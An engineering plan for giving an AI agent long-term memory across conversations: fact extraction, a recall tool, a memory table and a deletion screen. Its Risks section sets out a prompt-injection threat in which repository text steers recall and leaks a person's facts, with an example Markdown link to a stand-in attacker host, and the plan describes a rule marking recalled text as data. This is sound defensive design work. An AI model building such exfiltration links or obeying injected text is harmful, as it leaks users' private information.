# Agent remembers long-term knowledge across conversations

Status: active
Owner:
Last updated: 2026-11-02
Branch: feat/agent-long-term-memory
Base: 40f150758262bf9e8f0ffef9152b3ea963350c2b
Approval: delegated (2026-11-02, "continue from backlog with recomandations"); the driver checked the Assumptions against the installed `anthropic` 2.3.0 and `mcp` 2.3.0 and the `claude-api` skill first
Stages: backend, frontend, qa
Retired: none

## Goal

A person states a fact in one conversation and, in a new conversation, the agent decides to recall it and uses it, for that person alone. At `/memory` they read what it remembers and delete any of it, and a deleted memory is never recalled again. That closes AC07. It also builds what later plans reuse: `services/anthropic.py › parse_turn`, a `knowledge` server that takes a list of tools, and a caller that travels outside the model's arguments.

## Scope

- In:
  - Extraction: after a completed run, a bus reaction reads that run's `user` message alone through `parse_turn` and stores what it finds, embedded. There is no model-facing write tool, and a failure touches nothing and logs no content.
  - `recall`, a second tool on `knowledge`, at `allow` through a migration, passing `_clear` like any other tool; memories reach the model only in a `tool_result`.
  - Table `memory`, `GET /api/memory`, `DELETE /api/memory/{id}` and the screen `/memory`, owner only.
  - A delete removes the row and its embedding, so recall stops at once, everywhere. A conversation that already read the memory keeps it: its stored `tool_result`, `tool_call.result` and `run_event` are never edited, its model can still use it and its tool row still shows it, as the person's own message still does in the conversation it came from. The screen says so (Question 3).
- Out:
  - Keyword search over memories, near-duplicate detection, editing a memory: AC07 asks none of them, and nothing has measured recall. Proposed: `- [ ] admin can measure memory extraction and recall with an eval run`.
  - A choice to keep memory off, and a notice when one is saved, which would be an event after `run_finished`. Proposed: `- [ ] user can turn memory off`, `- [ ] user sees when a memory is saved`. Removing memory text from history is `user can delete a conversation`, queued, which also decides what becomes of a memory's link; nothing cascades here.
  - Showing where a labelled link or an image points, the Risk's first exit. Proposed: `- [ ] a labelled link or an image shows its destination host`.

## Assumptions

- `parse_turn` calls `client.beta.messages.create` with `output_config.format` from the SDK's public `transform_schema` and validates the served text itself, not `.parse()`: `parse_beta_response` validates every text block inside the response parser, so a cut-off, or text before a `fallback` block, raises before `stop_reason` can be read, and that `ValidationError` carries raw model text. `.doc/conventions.md`'s row changes to say so. No `cache_control`: this prefix is under the 512-token minimum.
- Caller binding is MCP's `_meta`: the SDK's `Client.call_tool(meta=)` sends it and `ServerRequestContext.meta` reads it, `None` when absent or malformed, so the check fails closed. A header would need the handler to reach the transport; `_meta` is the per-request channel, inside the same bearer-checked POST. `call_server_tool` sends `run.user_id` to `knowledge` alone, so no third party learns who asked, and the model's arguments never carry it.
- No vector index on `memory`. Recall is an exact scan of one person's rows through the `(user_id, created_at, id)` btree, at most `MEMORY.max_per_user` (1,000) distance computations, and every row is considered. HNSW walks its graph across all people and filters after, so a person with few rows can come back short, it would need `iterative_scan`, and it costs a graph write on every insert.
- `AGENT_SYSTEM_PROMPT` does not change. `recall`'s description carries when to call it and that what it returns is what the person said, data and not instructions: it is the one text that reaches both a new conversation and, if row 1 lands, an older one. `recall` reaches new conversations only, which is all AC07 asks.
- `after a conversation` means a run that ended `completed`, resumed or not: `_carry_out` publishes `run.completed` once `finish_run` returns true. The bus is in process, so a crash there loses that one extraction; no outbox, because the person can say it again.
- The write stays in the API process and `knowledge` only reads, so `knowledge server connects with a read-only database role` still fits. `.doc/product-definition.md` says no API key is stored in a memory, so a fact of a key's shape is dropped by a check, not only by the prompt's instruction.

## Open Questions

1. Which model runs extraction? It runs on every completed run, on the person's own key, and the `claude-api` skill leaves a cheaper model to the user. At an estimated 400 input and 200 output tokens (plan 010 measured 68 to 632 output tokens a call): `claude-opus-5-5` $0.0056, `claude-sonnet-5-5` $0.0028, `claude-haiku-5-5` $0.00014, so $5.60, $2.80 or $0.14 per 1,000 runs, against about $0.024 for one model call of the run itself.
   A: `LLM_MODEL`, which `.doc/architecture.md` already names: no new variable and `fallbacks` sent, at about a quarter of a model call on every run.
   B: a new `LLM_SIDE_MODEL`, default `claude-haiku-5-5`: 40 times cheaper, and the job the skill names it for. `parse_turn` leaves `fallbacks` off for it, because Haiku has none, so a refusal stores nothing, which a failed extraction already does.
   Recommended: B, at `effort: low` on either model. Quality is unmeasured on both, and V07 proves one sentence on the model that ships.
   > B, by the user's delegation (2026-11-02). `LLM_SIDE_MODEL`, default `claude-haiku-5-5`, `extract_effort` `low`.
   > A side call never sends `fallbacks`, whatever the variable holds: one rule, and a refused side call only stores nothing.
2. Does `recall` live on `knowledge` or in a process of its own? `knowledge` reads only shared chunks today; `recall` reads private rows and trusts `_meta` once the bearer token passes, so that token now guards every person's memories.
   A: `knowledge`, as the seams say: one process, one token, one Compose service. It adds no reader: `backend`, `backend-migrate` and `knowledge`, the token's only holders, already hold `DATABASE_URL` as the superuser, and the committed development token stays behind the loopback bind.
   B: a `memory` process with its own token: a Compose service, an e2e web server, an entry contract and an `mcp_server` row, removing no reader while those processes share one superuser.
   Recommended: A.
   > A, by the user's delegation (2026-11-02).
3. What does the screen say about a deleted memory a conversation already read? Scope states what stays; the question is how much the person is told.
   A: one plain sentence in the confirm dialog on every delete: recall stops at once, and a conversation that already read it keeps it. Free, and true whether or not any did.
   B: record each read and name those conversations in the dialog: a new table, and a write in `knowledge`, to narrow one sentence.
   C: append a `role: "system"` turn telling them it was deleted: thinking stays valid, but it adds a `message.role`, the text stays in history, and the model is only asked to ignore it.
   Recommended: A.
   > A, by the user's delegation (2026-11-02). The sentence is on every delete, and Scope says what stays.

## Contract

| Endpoint | Request | Response | Errors |
| --- | --- | --- | --- |
| `GET /api/memory` | `query.cursor?`, `query.limit?` (`PageQuery`) | `MemoryPage { items: Memory[], nextCursor }`, newest first, the caller's only; `Memory { id, content, conversationId, createdAt }`, no embedding | 400, 401, 500 |
| `DELETE /api/memory/{id}` | `params.id: string` | 204, no body | 400, 401, 404 (another user's, an admin's included), 500 |

- `RunEvent`, `RunErrorCode` and `ToolCallStatus` do not change: a recall is a tool call like any other.
- `knowledge`, outside `openapi.json`: the model sees `knowledge__recall`, taking `{ query: string }`, `required`, `additionalProperties: false`, `strict`, no user field. The caller is `_meta["assistant.knowledge/user_id"]`. Its result is one text block of JSON: `{ memories: [{ content, createdAt }] }`, best first, at most `MEMORY.recall_limit`, mapped field by field. None is a success.
- A failure is `isError` with one fixed code: `invalid_query`, `no_caller`, `busy`, `recall_unavailable`. `search` does not change.

## UX

- /memory — list — delete a memory, a row's ghost button, nothing being created here — states: loading `ListSkeleton` · empty `EmptyState` with a link to `/conversation` · error the group's `ErrorState`; a failed delete is a toast from the handler and the row stays; the delete opens a `ConfirmDialog`, cancel the default focus, whose body states Question 3's answer — tone: calm, dense, precise — phone: one column, the text wraps, the delete keeps its touch target

## Steps

### Backend

1. `backend/src/app/api/memory/schema.py`, `routes.py`, the `list_memory` and `delete_memory` handlers in `controller.py`, `service.py`, `backend/src/app/config/routes.py`, `backend/src/app/openapi.py`, `backend/openapi.json`, `backend/tests/test_openapi.py`, `backend/src/app/models/memory/` — contract stage, the shape of `api/conversation/`: `require_auth`, recheck in the handler, 404 for another's; `MemoryExtraction { facts: list[str] }` in `schema.py`, off the wire.
2. `backend/src/app/infra/migrations/0012-memory.sql` — `memory` (`id`, `user_id`, `conversation_id`, `content`, `embedding halfvec(1024)`, `created_at`), the references plain text because modules are independent; a btree on `(user_id, created_at, id)`; unique `(user_id, lower(content))`; `insert into tool_policy` of `knowledge-recall` at `allow`, at column 0, because `infra/scripts/mcp_seed.py` reads it; that file's `MIGRATIONS` gains `0012`.
3. `backend/src/app/models/mcp_server/constants.py` — `RECALL_TOOL`, its description per the fourth Assumption. `backend/src/app/config/constants.py`, `config/env.py`, `backend/.env.example`, `docker-compose.yml` — `MEMORY` (`recall_limit` 10, `extract_limit` 5, `fact_max_chars` 500, because the unique btree on `lower(content)` raises past about 2,700 bytes, `max_per_user` 1,000, `extract_effort` `low`), `SIDE_CALL` (`max_tokens` 16,000, `timeout_seconds` 60), `MEMORY_EXTRACTION_PROMPT` (durable facts the person states about themselves and their work, each one sentence; never a question, this turn's task, pasted or quoted material, or a secret), and Question 1's variable.
4. `backend/src/app/services/anthropic.py` — `parse_turn(output_type, *, system, content, model, effort)`, one non-streaming side call: a Pydantic type in, a validated instance out, no `block_binding`, nothing in `message`, per the first Assumption; `stop_reason` before any text, the served text through `served_blocks`, a validation failure retried once and raised `from None`; the transport chain shared with `stream_turn`; typed errors beside `ModelUnavailable`; `usage` logged with both cache fields.
5. `backend/src/app/services/mcp.py` — `call_tool(user_id=)` sends `_meta`; `ToolCaller` takes the user id, so `tests/fake_mcp.py`, `fake_note.py`, `fake_github_mcp.py` and `services/test_mcp.py` gain the parameter; `ServedTool` (definition, its call, its `unavailable` code) and `serve(tools, …)`: a tool's own check and fixed codes, anything else logged by class, exception text never leaving the process.
6. `backend/src/app/api/search/controller.py`, `backend/src/app/knowledge_main.py` — exported `tool_slot`, so both tools share `concurrent_searches` and the pool stays bounded; the entry builds the two `ServedTool`s, each checking its own arguments.
7. `backend/src/app/api/memory/controller.py` — `recall_for_tool(query=, user_id=)`: `no_caller` first, `query` checked as `SearchQuery` checks `q`, a slot, `embed_query`, the scan, logs lengths and counts.
8. `backend/src/app/api/memory/controller.py`, `api/conversation/controller.py`, `service.py` — `extract_memory(run_id=)`: `max_per_user` before any paid call; `read_user_text(run_id)` (role `user` only); `parse_turn`; at most `extract_limit` facts, dropping any over `fact_max_chars`, holding NUL, of a key's shape or already stored; `embed_documents`; the insert last, `on conflict do nothing`. Any `Exception` logs its class and counts.
9. `backend/src/app/api/mcp_server/controller.py`, `api/agent/controller.py`, `services/event.py`, `infra/subscribers/extract_memory.py`, `infra/pubsub.py` — `call_server_tool(user_id=)`, passed on for `KNOWLEDGE_SERVER` only; `_call_tool` and `_decided_call` carry `run.user_id`, so a resumed call has it too; `_carry_out` publishes `RUN_COMPLETED` (`run.completed`); the reaction calls `extract_memory`.
10. `backend/tests/fake_anthropic.py` — a non-streaming answer for a side call (it only streams today), `request_problem` over it, `[[fact:…]]`, `[[extract_refused]]`, `[[extract_cut]]`, `[[extract_invalid]]`, `[[extract_invalid_once]]`, and `[[recall]]`, which calls `knowledge__recall` and answers from its `tool_result`. `backend/tests/test_memory.py`, `test_agent_memory.py`, `services/test_anthropic.py`, `services/test_mcp.py`, `test_knowledge.py`, `db/test_mcp_seed.py` — the proofs; a test that counts `knowledge`'s tools moves to two, kept by name.
11. `backend/AGENTS.md` — the layer map, `The agent` (the second tool, `_meta`, `parse_turn`), a `Memory` section.

### Frontend

1. `frontend/src/shared/api/generated/` — `contract`, once the backend's contract stage has reported.
2. `frontend/src/entity/memory/` — `api/memory.ts` (`memoryListKey`, `memoryListQuery`, infinite), `model.ts`, `ui/memory-row.tsx`: the text as plain text, its date, a link to its conversation.
3. `frontend/src/feature/delete-memory/` — `api/delete-memory.ts`, `model.ts`, `ui/delete-memory-button.tsx`, opening a `ConfirmDialog`.
4. `frontend/src/widget/memory-list/ui/memory-list.tsx`, `memory-list-skeleton.tsx`, `frontend/src/app/(site)/memory/page.tsx`, `app/routes.tsx` (`requireAccount`, the list loader), `app/nav.ts` (for every account).
5. `frontend/tests/unit/memory-routes.test.tsx`, `frontend/tests/e2e/memory.spec.ts`, `conversation-support.ts`, `screens.spec.ts` — `MARKER.recall`; the journey across two conversations and a second account; `/memory` signed in.

### Driver

1. `.doc/architecture.md` — `knowledge`'s row, Data Flow item 12, the Data Model, Question 1's model, the Change Log. `.doc/product-definition.md` — the retention line: memory text goes to Voyage AI, and a deleted memory stays in a conversation that read it. `.doc/glossary.md` — `recall`, `extraction`, `side call`, `delete`. `.doc/conventions.md` — the Structured outputs row and, per Question 1, the model line. `README.md` — Features, the Voyage paragraph, then `node scripts/readme.mjs --configuration`.

## Validation

- V01 — `parse_turn` returns a validated instance through `output_config.format`; a text that fails validation is retried once, then a typed error, never returned as valid; a `refusal` and a cut-off are typed errors read before any text, with no retry; text before a `fallback` block is ignored; it writes no `message`, sends no `block_binding`, and logs usage with both cache fields and no content (AC07) — proof: `backend/tests/services/test_anthropic.py::TestParseTurn`
- V02 — After a completed run, resumed or not, a stated fact is stored once with its embedding, owner and conversation; the side call's request holds that run's `user` message and no assistant text, tool output or earlier turn; a failed or paused run extracts nothing; a repeated fact and a key-shaped fact store nothing, and a person at `max_per_user` costs no paid call; a refusal, invalid output or Voyage down leaves the run, its events and `memory` as they were and the log free of the message's text (AC07) — proof: `backend/tests/test_memory.py::TestExtraction`
- V03 — In a new conversation a run calls `knowledge__recall` through `_clear`; the fact reaches the model only in a `tool_result`, and `system` and the stored user turn hold none of it; a stored conversation is offered nothing new; a recall spends `AGENT_TOOL_CALLS_PER_RUN`; at `deny` nothing reaches the server; `search` answers as before (AC07) — proof: `backend/tests/test_agent_memory.py::TestRecall`, `backend/tests/test_knowledge.py::TestRecallTool`, `frontend/tests/e2e/memory.spec.ts › uses a fact in a new conversation`
- V04 — A second person's recall returns none of the first's memories, directly and through the loop; no `_meta`, or a malformed one, is `no_caller` with no embedding and no read; an input naming a user fails its schema before any server; `_meta` holds `run.user_id` on a call approved and resumed; `github` and a third-party server receive none (AC07) — proof: `backend/tests/test_memory.py::TestCallerBinding`, `backend/tests/services/test_mcp.py::TestCallerMeta`, `backend/tests/test_agent_memory.py::TestOwnerOnly`
- V05 — `GET /api/memory` pages the caller's memories newest first with no embedding; `DELETE` is a 204 and the row is gone; another's is a 404, an admin's included; no token is a 401. `/memory` shows the list, each designed state, the link to the conversation and a delete behind a confirm stating Question 3's answer; memory text stays inert; the accessibility scan passes (AC07) — proof: `backend/tests/test_memory.py::TestRoutes`, `frontend/tests/unit/memory-routes.test.tsx`, `frontend/tests/e2e/memory.spec.ts`, `frontend/tests/e2e/screens.spec.ts`
- V06 — After a delete, recall never returns it, in a new conversation or in the one that read it; that conversation's `tool_result`, `tool_call` and `run_event` are unchanged and its next request passes the fake's prefix check (AC07) — proof: `backend/tests/test_agent_memory.py::TestDeleted`, `frontend/tests/e2e/memory.spec.ts › a deleted memory is not used again`
- V07 — With real keys, two new conversations of one message each. `I keep a service's deploy notes in ops/RUNBOOK.md, never in the README, in every project.` stores that fact once, on a schema the real API accepts. `Where should the deploy notes for a new service go?` calls `knowledge__recall` of the model's own accord and answers `ops/RUNBOOK.md`, and stores no memory; no request is refused (AC07) — proof: the user's run, once, after the last fix round, on the running stack and the tree that will be committed, after `migrate`; it stops before the second message if the first run's `usage_out` passes 5,000; a failed message is fixed and re-run alone. Estimate: three or four model calls at `high` and two extractions, from plan 010's measured $0.12 for five calls and 52,270 characters of results, with none of those here: $0.03 to $0.12, a cent less on Haiku, plus Voyage under $0.001; a search the model adds costs about $0.03. The driver records `memory`, `tool_call` and the `usage` lines under `Changes during the task`; QA has no key, so it reports V07 pending
- V08 — Every gate and the e2e suite pass with no network and no API key (AC01) — proof: `node scripts/verify.mjs --plan <plan> --reuse`

## Risks

- Extraction spends on every completed run, bound only by `message_per_user`: 2,880 a day at a 32,000-character message is about $120 on Opus and $3 on Haiku; and the model may recall on every first message, one more model call — accepted, because the run itself costs more, the description says when to recall, and V07 records it; `agent runs have a spend cap` must count side calls, and `parse_turn`'s usage log is there for it.
- A document the person pastes reaches extraction, because it is their message, so reading no tool output does not stop a paste — the prompt excludes quoted material, a memory is data that widens no policy, and `/memory` is the correction.
- Repository text can steer `recall`, then a tool's arguments or the answer, so a person's facts from other conversations sit one steered call from two exits: a labelled Markdown link hides its destination, so `[the docs](https://evil.example/?d=<fact>)` leaves on one click, and a third-party tool an admin set to `allow` takes arguments with no person in view, because `effects_for` caps `github` alone — open: a link needs a click, a third-party row is opt-in and has no route yet, no GitHub read writes anywhere an attacker can read it, and GitHub's writes stay at `ask` with their arguments in view. `Out` proposes the line for the link, and `.doc/conventions.md › Agent security` holds the third-party decision for `admin can add and remove a third-party MCP server`.
- Extraction quality is unmeasured and the fake can drift from the real wire — `request_problem` refuses what the skill's limits name, V07 proves one sentence, and the proposed eval line measures the rest. If V07's model does not recall, the remedy is one sentence in `AGENT_SYSTEM_PROMPT` for new conversations, which is enough for AC07.
- A `knowledge` process older than this branch lists only `search`, and a conversation started then never gets `recall` — plan 010's frozen prefix; Compose rebuilds it, and the README already starts `knowledge` first.

## Rollback

Revert the branch. `0012-memory.sql` adds a table and one policy row the old code ignores. A conversation started on this branch holds `knowledge__recall` in its frozen tools: after a revert a call is `unknown_tool`, a fixed `is_error` result, and its prefix stays valid. Removing them is a human's and loses every memory: drop `memory`, then delete the `knowledge-recall` row and the file's `schema_migration` row.

## Changes during the task

- Driver, before the agents: `.doc/glossary.md` and `.doc/conventions.md` changed first, because every agent loads them. The rest of the Driver step went in before the review, so the reviewers read it. A side call never sends `fallbacks`, whatever `LLM_SIDE_MODEL` holds (Question 1's answer), so `.doc/conventions.md`'s `fallbacks` line now names a conversation's turn.
- Backend: `ServedTool` and `serve` give `ToolCaller` a third `caller` argument; `ToolRecallFailed` (`models/memory/enums.py`, `type.py`) sits beside `ToolSearchFailed`; `tool_slot` raises `ToolBusy`, which each caller translates to its own `busy`.
- Backend: `_call_tool(run_id, user_id, block, prefix, *, allowed)` gained `user_id`, so `tests/test_qa_knowledge.py` calls it with one more argument. No test removed.
- Backend: tests that counted `knowledge`'s tools moved to two, by name, in `test_agent.py`, `test_agent_github.py`, `test_agent_knowledge.py`, `test_knowledge.py`, `test_mcp_server.py`, `test_qa_knowledge.py` and `test_tool_policy.py`. Renamed: `test_offers_one_strict_tool_...` to `test_offers_two_strict_tools_...`, and `..._its_search_policy` to `test_knowledge_has_its_search_and_recall_policies`. None deleted.
- Backend: `backend/pyproject.toml` adds `app.infra.pubsub -> app.infra.subscribers.extract_memory` to the two `ignore_imports` lists, as for every other subscriber.
- Backend: the contract stage has no `no unknown query field` test: `QueryModel` ignores extra keys, as `/api/conversation` does, and the plan names no such rule.
- Backend: `TestRecallTool`, `test_agent_memory.py`, `tests/services/test_secret_shape.py` and the `db/test_mcp_seed.py` edit were written after their code, so they have no red run. The report says so; QA judges it against done item 2.
- Backend: the resume path is proven through `test_a_resumed_run_publishes_run_completed_once_it_completes` and the approval-resume recall test. `recall`'s tool tests patch `memory_controller.embed_query`, the provider boundary, not the data layer.
- Review round 1: the two P1s, then the small P2s in this task's own files. `read_user_text` takes the conversation id as well as the run id, so step 8's `read_user_text(run_id)` is out of date and `find_user_text` uses `message`'s `(conversation_id, position)` index. The second Risk line's claim that every write stays at `ask` was false for a third-party tool at `allow`, and the Risk now says so.
- Decided by the driver in round 1: `secret_shape._RUN` keeps dropping a long path holding a digit, a commit hash and a UUID, and the tests pin those drops. Both reviews raised it from opposite sides; a lost fact can be restated, while a stored key goes to Voyage. The security report's exception for short `/`-separated segments is not taken, because an AWS secret with two `/` would pass it.
- Decided by the driver in round 1: `knowledge` keeps importing `api/memory/controller.py`, so it loads the write side and the Anthropic SDK, about 1.18 s at boot and no key in its environment. A lazy import to hide that is less explicit than a line in `knowledge_main.py`'s docstring.
- After the round's re-reviews, both pass, no open P0 or P1: the driver corrected three stale lines of the class the round had taken, with no change in behaviour (`backend/AGENTS.md`'s `read_user_text` signature, and `one tool` in `backend/pyproject.toml` and `frontend/playwright.config.ts`), moved the link line to `Out`, and put the third-party decision in `.doc/conventions.md › Agent security`. The code P2s the re-reviews raised stay open in the reports; no second round, because its re-reviews would cost far more than these fixes.
- Frontend: `screens.spec.ts` gains a populated `/memory-list` capture beyond the plan's `/memory`, at the driver's request, because the row is the screen's main content. It has its own account and stays out of a Compose run, where the Anthropic fake is absent. `frontend/AGENTS.md › Tests` names both.

